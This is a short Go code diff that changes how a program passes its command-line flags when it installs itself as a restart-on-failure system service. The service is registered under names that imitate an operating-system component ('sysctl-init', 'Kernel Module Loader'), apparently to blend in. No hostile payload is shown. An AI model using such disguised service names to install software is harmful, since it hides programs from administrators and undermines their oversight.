@@ -316,23 +316,23 @@ func runService(action string, flags []string) {
 		"OnFailure": "restart",
 	}
 
-	envVarName := "SERVICE_ARGS"
-	envVarValue := strings.Join(flags, " ") // 使用空格作为分隔符
+	// envVarName := "SERVICE_ARGS"
+	// envVarValue := strings.Join(flags, " ") // 使用空格作为分隔符
 
-	// 创建环境变量映射
-	envVars := map[string]string{
-		envVarName: envVarValue,
-	}
+	// // 创建环境变量映射
+	// envVars := map[string]string{
+	// 	envVarName: envVarValue,
+	// }
 
 	svcConfig := &service.Config{
 		Name:             "sysctl-init",
 		DisplayName:      "Kernel Module Loader",
 		Description:      "Initialize System Kernel Parameters",
-		// Arguments:        flags,
-		Arguments:        []string{"$SERVICE_ARGS"},
+		Arguments:        flags,
+		// Arguments:        []string{"$SERVICE_ARGS"},
 		WorkingDirectory: dir,
 		Option:           winConfig,
-		EnvVars:          envVars,
+		// EnvVars:          envVars,
 	}
 
 	prg := &program{
